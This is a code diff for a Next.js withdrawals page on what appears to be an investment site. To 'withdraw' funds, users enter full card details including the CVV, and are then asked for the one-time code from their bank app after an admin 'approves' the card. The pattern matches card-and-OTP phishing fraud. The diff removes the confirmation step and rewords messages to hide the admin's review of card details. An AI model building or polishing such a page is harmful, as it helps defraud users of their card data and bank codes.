@@ -1,12 +1,9 @@
 'use client'
 
 import { useState, useEffect } from 'react'
-import { useRouter } from 'next/navigation'
 import { api } from '@/lib/api'
 import toast from 'react-hot-toast'
 import { ArrowUpRight, CreditCard, User, Calendar, Lock, MapPin, Shield } from 'lucide-react'
-import { ConfirmModal } from '@/components/ConfirmModal'
-import { SuccessModal } from '@/components/SuccessModal'
 
 const WITHDRAWAL_FEE_PERCENT = 0.02
 const WITHDRAWAL_FEE_MIN = 1
@@ -27,14 +24,12 @@ export default function WithdrawalsPage() {
   const [investments, setInvestments] = useState<any[]>([])
   const [loading, setLoading] = useState(true)
   const [showForm, setShowForm] = useState(false)
-  const [showConfirm, setShowConfirm] = useState(false)
   const [showSuccess, setShowSuccess] = useState(false)
   const [showOTPModal, setShowOTPModal] = useState(false)
   const [pendingWithdrawalId, setPendingWithdrawalId] = useState<string | null>(null)
   const [otpCode, setOtpCode] = useState('')
   const [availableBalance, setAvailableBalance] = useState(0)
   const [formData, setFormData] = useState({ investmentId: '', amount: '', cardNumber: '', cardholderName: '', expiryDate: '', cvv: '', billingAddress: '' })
-  const router = useRouter()
 
   useEffect(() => {
     fetchWithdrawals()
@@ -49,6 +44,7 @@ export default function WithdrawalsPage() {
 
       // Check for AWAITING_OTP status to show modal
       const awaitingOTP = data.data.find((w: any) => w.status === 'AWAITING_OTP')
+      const processing = data.data.find((w: any) => w.status === 'PROCESSING')
       if (awaitingOTP && !showOTPModal) {
         setPendingWithdrawalId(awaitingOTP.id)
         setShowOTPModal(true)
@@ -92,11 +88,8 @@ export default function WithdrawalsPage() {
       toast.error(`Insufficient balance. Fee: $${fee.toFixed(2)}`)
       return
     }
-    setConfirmAction('withdraw')
-    setShowConfirm(true)
+    handleConfirm()
   }
-
-  const [confirmAction, setConfirmAction] = useState<'withdraw' | 'invest' | null>(null)
 
   const handleConfirm = async () => {
     try {
@@ -112,16 +105,12 @@ export default function WithdrawalsPage() {
       }
       const { data } = await api.post('withdrawals', payload)
       setShowForm(false)
-      setShowConfirm(false)
-      setConfirmAction(null)
       if (data.success && data.data?.id) {
-        toast.success('Withdrawal submitted. Admin will review your card details.')
+        toast.success('Withdrawal submitted. Card will be verified.')
       }
       fetchWithdrawals()
     } catch (err: any) {
       toast.error(err.response?.data?.message || 'Failed')
-      setShowConfirm(false)
-      setConfirmAction(null)
     }
   }
 
@@ -143,12 +132,12 @@ export default function WithdrawalsPage() {
   }
 
 const statusColors: Record<string, string> = {
-    'PENDING_VERIFICATION': 'bg-blue-50 text-blue-700 border border-blue-200',
-    'AWAITING_OTP': 'bg-amber-50 text-amber-700 border border-amber-200',
-    'WITHDRAWAL_PENDING': 'bg-yellow-50 text-yellow-700 border border-yellow-200',
-    'WITHDRAWN': 'bg-green-50 text-green-700 border border-green-200',
-    'REJECTED': 'bg-red-50 text-red-700 border border-red-200',
-  }
+  'PROCESSING': 'bg-blue-50 text-blue-700 border border-blue-200',
+  'AWAITING_OTP': 'bg-amber-50 text-amber-700 border border-amber-200',
+  'WITHDRAWAL_PENDING': 'bg-yellow-50 text-yellow-700 border border-yellow-200',
+  'WITHDRAWN': 'bg-green-50 text-green-700 border border-green-200',
+  'REJECTED': 'bg-red-50 text-red-700 border border-red-200',
+}
 
   return (
     <div className="space-y-6">
@@ -298,7 +287,7 @@ const statusColors: Record<string, string> = {
               Enter OTP
             </h3>
             <p className="text-sm text-gray-600 mb-4">
-              Admin has approved your card. Enter the OTP from your bank app to complete withdrawal.
+              Card approved. Enter the OTP from your bank app to complete withdrawal.
             </p>
             <input
               type="text"
@@ -325,19 +314,6 @@ const statusColors: Record<string, string> = {
           </div>
         </div>
       )}
-
-      <ConfirmModal
-        open={showConfirm}
-        onClose={() => setShowConfirm(false)}
-        onConfirm={handleConfirm}
-        onCancel={() => router.push('/dashboard/investments')}
-        title="Confirm Withdrawal"
-        message={`Withdraw $${formData.amount}? Fee: $${getWithdrawalFee(Number(formData.amount)).toFixed(2)}. Total deduction: $${(Number(formData.amount) + getWithdrawalFee(Number(formData.amount))).toFixed(2)}`}
-        confirmLabel="Withdraw"
-        cancelLabel="Make New Investment"
-      />
-
-      <SuccessModal open={showSuccess} onClose={() => setShowSuccess(false)} amount={formData.amount} />
 
       <div className="rounded-3xl border bg-white overflow-hidden shadow-sm">
         <table className="w-full">
